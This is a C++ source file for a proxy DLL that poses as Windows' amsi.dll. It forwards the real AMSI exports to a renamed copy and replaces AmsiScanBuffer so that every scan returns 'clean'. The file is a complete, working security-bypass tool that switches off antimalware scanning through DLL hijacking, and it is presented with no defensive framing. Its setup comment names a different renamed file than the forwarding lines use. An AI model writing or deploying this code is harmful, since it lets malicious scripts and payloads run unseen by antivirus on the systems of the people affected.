// dllmain.cpp : Defines the entry point for the DLL application.

#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

// generated with sharpdllproxy.
// place amsi.dll renamed as tmp61DB.dll in the same directory for the forwards to work
#pragma comment(linker, "/export:AmsiCloseSession=tmp6D1B.AmsiCloseSession,@1")
#pragma comment(linker, "/export:AmsiInitialize=tmp6D1B.AmsiInitialize,@2")
#pragma comment(linker, "/export:AmsiOpenSession=tmp6D1B.AmsiOpenSession,@3")
#pragma comment(linker, "/export:AmsiScanString=tmp6D1B.AmsiScanString,@5")
#pragma comment(linker, "/export:AmsiUacInitialize=tmp6D1B.AmsiUacInitialize,@6")
#pragma comment(linker, "/export:AmsiUacScan=tmp6D1B.AmsiUacScan,@7")
#pragma comment(linker, "/export:AmsiUacUninitialize=tmp6D1B.AmsiUacUninitialize,@8")
#pragma comment(linker, "/export:AmsiUninitialize=tmp6D1B.AmsiUninitialize,@9")
#pragma comment(linker, "/export:DllCanUnloadNow=tmp6D1B.DllCanUnloadNow,@10")
#pragma comment(linker, "/export:DllGetClassObject=tmp6D1B.DllGetClassObject,@11")
#pragma comment(linker, "/export:DllRegisterServer=tmp6D1B.DllRegisterServer,@12")
#pragma comment(linker, "/export:DllUnregisterServer=tmp6D1B.DllUnregisterServer,@13")

#define AMSI_RESULT_CLEAN 0

extern "C" __declspec(dllexport) HRESULT AmsiScanBuffer(
   HANDLE amsiContext,
   PVOID buffer,
   ULONG length,
   LPCWSTR contentName,
   LPVOID amsiSession,
   INT* result
)
{
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
